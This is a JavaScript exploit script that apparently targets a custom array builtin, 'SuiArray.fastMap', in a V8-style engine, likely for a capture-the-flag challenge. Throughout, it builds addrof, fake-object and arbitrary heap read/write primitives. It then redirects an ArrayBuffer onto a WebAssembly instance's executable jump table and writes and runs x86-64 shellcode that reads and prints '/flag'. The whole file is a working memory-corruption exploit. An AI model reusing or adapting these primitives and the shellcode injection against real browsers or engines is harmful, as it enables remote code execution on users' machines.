let conv_buf = new ArrayBuffer(8);
let conv_f64 = new Float64Array(conv_buf);
let conv_u64 = new BigUint64Array(conv_buf);

function ftoi(x) {
  conv_f64[0] = x;
  return conv_u64[0];
}

function itof(x) {
  conv_u64[0] = x;
  return conv_f64[0];
}

function addrof(obj) {
  let a = SuiArray.pack([1.1, 2.2, 3.3, 4.4]);
  let x = SuiArray.fastMap(a, () => { a[0] = obj; }, 0);
  return ftoi(x) & 0xffffffffn;
}

let alignment_pad = SuiArray.pack([9.9, 8.8, 7.7, 6.6]);
let rw = SuiArray.pack([5.5, 6.6, 7.7, 8.8]);
let anchor = {name: "anchor"};
let fake = [anchor, anchor, anchor, anchor];
let backing = new ArrayBuffer(0x1000);
let backing_view = new Uint8Array(backing);
let shellcode = new Uint8Array([
  0x48, 0x81, 0xec, 0x00, 0x04, 0x00, 0x00,
  0x48, 0xb8, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x00, 0x00, 0x00,
  0x50, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x31, 0xd2,
  0xb8, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05,
  0x89, 0xc7, 0x48, 0x89, 0xe6, 0xba, 0x00, 0x01, 0x00, 0x00,
  0x31, 0xc0, 0x0f, 0x05, 0x89, 0xc2,
  0xbf, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0xe6,
  0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05,
  0x48, 0x81, 0xc4, 0x08, 0x04, 0x00, 0x00, 0x31, 0xc0, 0xc3
]);

let wasm_bytes = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
  0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
  0x03, 0x02, 0x01, 0x00,
  0x07, 0x07, 0x01, 0x03, 0x72, 0x75, 0x6e, 0x00, 0x00,
  0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x00, 0x0b
]);
let wasm_module = new WebAssembly.Module(wasm_bytes);
let wasm_instance = new WebAssembly.Instance(wasm_module);
let wasm_run = wasm_instance.exports.run;

let current;
let mutate = () => { current[0] = anchor; };
let noop = () => {};

// Keep the target objects alive and stable before grooming the pivot arrays.
%CollectGarbage(0);
%CollectGarbage(0);

let anchor_addr = addrof(anchor);
let rw_addr = addrof(rw);
let fake_addr = addrof(fake);
let backing_addr = addrof(backing);
let instance_addr = addrof(wasm_instance);

let pool = [];
for (let i = 0; i < 16; i++) {
  pool.push(SuiArray.pack([1.1, 2.2, 3.3, 4.4]));
}

let pivot_config = (typeof globalThis.PIVOT_CONFIG === "string")
    ? globalThis.PIVOT_CONFIG
    : "209746,209720,209679,209647,209627,209589,209565,209513,209487,209471|0101100011";
let pivot_parts = pivot_config.split("|");
let pivot_indices = pivot_parts[0].split(",").map(Number);
let pivot_high = pivot_parts[1].split("").map((x) => x === "1");
let pivot_used = 0;
function setElements(addr) {
  current = pool[pivot_used];
  let payload = pivot_high[pivot_used]
      ? (addr << 32n)
      : (addr | (BigInt(rw.length << 1) << 32n));
  SuiArray.fastMap(current, mutate,
                  Number(pivot_indices[pivot_used]),
                  itof(payload));
  pivot_used++;
}

function heapRead(addr, offset) {
  setElements(addr);
  return ftoi(SuiArray.fastMap(rw, noop, offset / 8 - 1));
}

function heapWrite(addr, offset, value) {
  setElements(addr);
  SuiArray.fastMap(rw, noop, offset / 8 - 1, itof(value));
}

// Probe the pivot before using the higher-level primitives.
print("anchor=" + anchor_addr.toString(16) + " rw=" + rw_addr.toString(16) +
      " fake=" + fake_addr.toString(16) + " backing=" +
      backing_addr.toString(16) + " instance=" + instance_addr.toString(16));
setElements(anchor_addr);
print("pivot=" + ftoi(SuiArray.fastMap(rw, noop, 0)).toString(16));

let fake_elements_word = heapRead(fake_addr, 8);
let fake_elements_addr = fake_elements_word & 0xffffffffn;
print("fake-word=" + fake_elements_word.toString(16) +
      " fake-elements=" + fake_elements_addr.toString(16));
setElements(fake_elements_addr);
SuiArray.fastMap(rw, noop, 0,
                itof(instance_addr | (anchor_addr << 32n)));
let fake_instance = fake[0];
print("fakeobj=" + (fake_instance === wasm_instance) +
      " fake-type=" + typeof fake_instance);

let instance_fields = heapRead(instance_addr, 8);
let trusted_addr = (instance_fields >> 32n) & 0xffffffffn;
let jump_table = heapRead(trusted_addr, 56);
print("trusted=" + trusted_addr.toString(16) +
      " jump=" + jump_table.toString(16));

let trusted_fields = heapRead(trusted_addr, 160);
let internal_functions_addr = (trusted_fields >> 32n) & 0xffffffffn;
let internal_functions_word = heapRead(internal_functions_addr, 8);
let internal_addr = internal_functions_word & 0xffffffffn;
print("internal-array=" + internal_functions_addr.toString(16) +
      " word=" + internal_functions_word.toString(16) +
      " internal=" + internal_addr.toString(16));

let old_backing = heapRead(backing_addr, 32);
print("backing=" + old_backing.toString(16));
wasm_run();
heapWrite(backing_addr, 32, jump_table);
heapWrite(internal_addr + 12n, 8, jump_table);
let hijack_view = new Uint8Array(backing);
hijack_view.set(shellcode);
print("view0=" + hijack_view[0]);
print("run=" + wasm_run());
